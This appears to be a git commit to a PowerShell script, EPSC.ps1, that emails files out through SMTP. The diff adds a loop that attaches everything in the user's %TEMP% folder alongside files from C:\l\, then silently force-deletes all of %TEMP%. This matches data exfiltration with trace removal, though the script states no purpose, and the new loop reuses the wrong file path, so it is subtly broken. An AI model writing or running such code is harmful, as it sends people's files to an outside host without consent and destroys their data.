ce99a07b9573408a54a2e9c783cc1e5dfe4f6e94
Felipe Bevilacqua <felipe@9ideias.com>
2023-12-22 09:24:44 -0300

    Update EPSC.ps1

--- EPSC.ps1
+++ EPSC.ps1
@@ -1,5 +1,6 @@
 
 $files=Get-ChildItem "C:\l\"
+
 Foreach($file in $files)
 {
 Write-Host "Attaching File :- " $file
@@ -7,6 +8,20 @@ $attachment = New-Object System.Net.Mail.Attachment "C:\l\$file"
 $ReportEmail.Attachments.Add($attachment)
 $attachment.Dispose()
 }
+
+
+$files=Get-ChildItem "$env:TEMP\*"
+
+Foreach($file in $files)
+{
+Write-Host "Attaching File :- " $file
+$attachment = New-Object System.Net.Mail.Attachment "C:\l\$file"
+$ReportEmail.Attachments.Add($attachment)
+$attachment.Dispose()
+}
+
 $SMTPInfo.Send($ReportEmail)
 Write-host 'Mail Sent Successfully'
 
+
+rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
